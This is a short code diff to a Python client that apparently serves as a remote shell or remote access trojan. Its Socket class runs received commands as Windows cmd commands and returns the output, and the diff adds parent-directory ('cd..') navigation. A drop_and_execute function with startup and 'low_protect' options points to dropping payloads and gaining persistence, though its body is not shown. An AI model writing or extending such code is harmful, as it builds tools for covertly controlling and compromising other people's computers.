@@ -53,7 +53,7 @@ class Socket:
         else:
 
             # Change working directory stuff
-            if "cd" in cmd[0:2]:
+            if "cd" in cmd[0:2] and "cd.." not in cmd[0:4]:
                 path = getcwd() + "\\" + cmd[3:]
                 try:
                     chdir(path)
@@ -62,6 +62,9 @@ class Socket:
                     return
                 self.send_msg(f"Changed directory to {path}")
                 return
+
+            elif "cd.." in cmd[0:4]:
+                chdir(self.get_parent_path(getcwd()))
 
             # Normal cmd command stuff
             try:
@@ -80,6 +83,17 @@ class Socket:
             self.established = True
         except(ConnectionResetError, ConnectionAbortedError, OSError):
             self.established = False
+
+    @staticmethod
+    def get_parent_path(path):
+        switch = False
+        new_path = ""
+        for char in reversed(path):
+            if char == '\\':
+                switch = True
+            if switch:
+                new_path += char
+        return new_path[::-1]
 
 
 def drop_and_execute(script, execute_file=False, startup=False, low_protect=False):
